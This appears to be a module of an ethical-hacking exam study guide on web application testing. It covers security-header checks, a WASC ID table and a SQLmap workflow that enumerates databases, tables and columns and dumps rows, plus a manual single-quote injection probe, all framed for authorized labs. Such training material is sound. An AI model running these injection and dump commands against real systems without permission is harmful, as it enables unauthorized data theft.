<p class="ceh-kicker">MODULE 03 · APPLICATION SECURITY</p>

# Web Application and Databases

> **Scope:** Use only the assigned app / test database. Enumerate the minimum data required by the objective. Do not treat a scanner's output as proof without checking request and response evidence.

!!! note "Fast lookup"
    Capture the normal HTTP response first. Test only the assigned application and parameter, then enumerate only the table / columns needed by the task.

??? tip "When SQLmap results are inconsistent"
    Preserve the authorized lab request, cookies and CSRF token. Recheck the app session and compare normal versus test responses before changing options.

## Quick reference

| Objective | Command / reference | Answer location |
|---|---|---|
| HTTP status / headers | `curl -sS -D - -o /dev/null <TARGET_URL>` | Status line and headers |
| Selected security headers | `grep -Ei 'strict-transport|content-security|x-frame|x-content-type|referrer-policy|permissions-policy|set-cookie'` | Header name + value |
| Test one SQL parameter | `sqlmap -u '<TARGET_URL>?id=1' -p id --batch --level=1 --risk=1` | Injectable parameter / DBMS result |
| List database names | SQLmap `--dbs` | Names in console output |
| List tables | SQLmap `-D <DB> --tables` | Table list |
| List columns | SQLmap `-D <DB> -T <TABLE> --columns` | Column names and types |
| Retrieve requested lab rows | SQLmap `-D <DB> -T <TABLE> -C <COLS> --dump` | Selected rows only |
| WASC ID | [WASC Reference Grid](https://projects.webappsec.org/w/page/13246974/Threat%20Classification%20Reference%20Grid) | Static category identifier |

## Scenario archetypes

| If the question asks… | Workflow |
|---|---|
| Find a database name | Confirm the assigned parameter, then use `--dbs` |
| Determine table / column names | Select one named DB and table; request `--tables` / `--columns` |
| Find a specific value | Name only the required columns and table; inspect returned row |
| Identify WASC ID for SQLi / XSS | Look up the vulnerability category in the reference grid |
| Check browser security headers | Inspect HTTPS response and redirects |
| Determine framing protection | Inspect CSP `frame-ancestors`, then X-Frame-Options |
| Determine HSTS | Check HTTPS response; browsers ignore HSTS delivered over HTTP |

## Core command / tool syntax

### 1. Baseline HTTP response and security headers

```bash
# Capture response headers without saving response body
curl -sS -D - -o /dev/null <TARGET_URL>

# Follow redirects and preserve response headers and final body separately
curl -sS -L -D <HEADER_FILE> -o <BODY_FILE> <TARGET_URL>

# Print the most frequently reviewed headers
curl -sS -D - -o /dev/null <TARGET_URL> |
  grep -Ei '^(HTTP/|strict-transport-security:|content-security-policy:|content-security-policy-report-only:|x-frame-options:|x-content-type-options:|referrer-policy:|permissions-policy:|cross-origin-.*:|set-cookie:)'
```

Do not use `-k` as the default; it disables TLS certificate validation. If the task explicitly supplies a lab self-signed certificate, record the certificate error separately rather than silently suppressing it.

### 2. SQLmap: detection → DB → table → column → selected rows

```bash
# Initial low-impact check of one task-provided parameter
sqlmap -u '<TARGET_URL>?id=1' -p id --batch --level=1 --risk=1

# List databases only after the objective / permitted test calls for enumeration
sqlmap -u '<TARGET_URL>?id=1' -p id --batch --dbs

# Tables in a particular lab database
sqlmap -u '<TARGET_URL>?id=1' -p id --batch -D <DB_NAME> --tables

# Columns of one table
sqlmap -u '<TARGET_URL>?id=1' -p id --batch -D <DB_NAME> -T <TABLE_NAME> --columns

# Dump only the columns required by the task
sqlmap -u '<TARGET_URL>?id=1' -p id --batch -D <DB_NAME> -T <TABLE_NAME> -C <COLUMN1>,<COLUMN2> --dump

# If authentication, POST values, CSRF tokens or cookies are required:
sqlmap -r <CAPTURED_REQUEST_FILE> -p <PARAMETER_NAME> --batch
```

If login state matters, capture the authorized request in Burp and use `-r`. Avoid broad database dumps. Follow lab rules and only retrieve the minimum data required for the answer.

### 3. Manual parameter comparison

For an intentionally vulnerable lab parameter, compare an ordinary input with one malformed input and check the server response:

```bash
curl -sS -G --data-urlencode 'id=1' '<TARGET_URL>' -D <NORMAL_HEADERS> -o <NORMAL_BODY>
curl -sS -G --data-urlencode "id=1'" '<TARGET_URL>' -D <TEST_HEADERS> -o <TEST_BODY>
diff -u <NORMAL_BODY> <TEST_BODY> | head -n 80
```

A SQL error is a clue, not conclusive proof. Confirm that the parameter controls a query and that the response difference is repeatable.

## Interpretation and output analysis

- Follow the SQLmap hierarchy: **database → tables → columns → the required row/value**.
- Record the exact parameter name, DBMS and detection result. Check whether a request is logged in or anonymous.
- Similar values can appear in multiple tables. Verify the database, table and column rather than choosing the first match.
- A **WASC ID** is a category label, not a CVE, CVSS score or severity ranking.
- Header presence alone is not a pass. Check its value, response context, and relevant directives.
- Review each `Set-Cookie` independently for `Secure`, `HttpOnly`, `SameSite`, path, domain and expiry. Never paste live session cookies into public notes.

## WASC quick lookup: Threat Classification Reference Grid

| WASC ID | Category | Quick interpretation |
|---|---|---|
| WASC-01 | Insufficient Authentication | Authentication does not adequately verify the identity |
| WASC-02 | Insufficient Authorization | Access exceeds the user's assigned rights |
| WASC-04 | Insufficient Transport Layer Protection | Sensitive transport is inadequately protected |
| WASC-08 | Cross-site Scripting (XSS) | Script can execute in another user's browser context |
| WASC-09 | Cross-site Request Forgery (CSRF) | Browser may be induced to submit an unwanted authenticated request |
| WASC-10 | Denial of Service | Availability impact through resource exhaustion |
| WASC-11 | Brute Force | Repeated credential guesses |
| WASC-13 | Information Leakage | Sensitive implementation / data details exposed |
| WASC-14 | Server Misconfiguration | Insecure server configuration |
| WASC-15 | Application Misconfiguration | Insecure application configuration |
| WASC-16 | Directory Indexing | Directory listing exposes paths / filenames |
| WASC-19 | SQL Injection | Input changes database query structure |
| WASC-20 | Improper Input Handling | Input is not validated or handled correctly |
| WASC-22 | Improper Output Handling | Output is not safely handled / encoded |
| WASC-33 | Path Traversal | Input escapes the intended filesystem path |
| WASC-45 | Fingerprinting | Exposed characteristics reveal software or technology |

The IDs above follow the WASC Threat Classification Reference Grid. The grid is an older taxonomy: confirm the label against the specific version used by your curriculum.

## Header interpretation table

| Header | Practical check |
|---|---|
| `Strict-Transport-Security` | Expect on HTTPS; review `max-age` and subdomain scope |
| `Content-Security-Policy` | Review `default-src`, `script-src`, and `frame-ancestors` |
| `X-Frame-Options` | `DENY` / `SAMEORIGIN` restrict framing; modern browsers prioritize CSP `frame-ancestors` when both are present |
| `X-Content-Type-Options` | Normally `nosniff` |
| `Referrer-Policy` | Determine whether cross-origin referrer data is limited |
| `Permissions-Policy` | Check whether unneeded browser features are disabled |
| `Set-Cookie` | Review `Secure`, `HttpOnly`, `SameSite`, scope and expiry |
| `X-XSS-Protection` | Deprecated; do not count it as a modern XSS defense |

## Wireshark / regex / CLI parsing

| Need | Filter / parser |
|---|---|
| HTTP requests | `http.request` |
| HTTP POST | `http.request.method == "POST"` |
| TLS | `tls` |
| HTTP response | `http.response` |
| Search report for WASC / header findings | `grep -Ei 'WASC-[0-9]+|SQL injection|cross.site scripting|CSP|HSTS|X-Frame-Options' <REPORT_FILE>` |
| SQLmap output highlights | `grep -Ei 'injectable|back-end DBMS|available databases|Database:|Table:' <SQLMAP_LOG>` |

## Edge cases and troubleshooting

| Symptom | Fallback |
|---|---|
| SQLmap finds no injection | Verify parameter and HTTP method; use captured request for POST / cookie / token state |
| Session redirects to login | Preserve the authorized session and CSRF token in request file |
| SQLmap runs too long | Reduce parameter scope and first-stage `--level` / `--risk`; query only required metadata |
| Responses vary | Check session expiry, rotating CSRF tokens, dynamic content and load balancing |
| Header absent on first response | Follow redirects and review each response in order |
| HSTS missing on HTTP | Inspect HTTPS; browsers ignore HSTS received over HTTP |
| No X-Frame-Options | Check CSP `frame-ancestors` before concluding the page is frameable |
| 403 / 429 | Follow the lab's rate limits; do not broaden scope or bypass protections blindly |

=== "Bash / Linux"
    ```bash
    curl -sS -D - -o /dev/null <TARGET_URL>
    grep -Ei 'content-security-policy|strict-transport-security|x-frame-options|set-cookie' <HEADERS_FILE>
    ```

=== "Windows PowerShell"
    ```powershell
    curl.exe -sS -D - -o NUL <TARGET_URL>
    Select-String -Path '<HEADERS_FILE>' -Pattern 'content-security-policy|strict-transport-security|x-frame-options|set-cookie'
    ```

## References

- [WASC Threat Classification Reference Grid](https://projects.webappsec.org/w/page/13246974/Threat%20Classification%20Reference%20Grid)
- [OWASP HTTP Headers Cheat Sheet](https://cheatsheetseries.owasp.org/cheatsheets/HTTP_Headers_Cheat_Sheet.html)
- [OWASP Secure Headers Project](https://owasp.org/projects/secure-headers-project)
- [SQLmap usage guide](https://github.com/sqlmapproject/sqlmap/wiki/Usage)
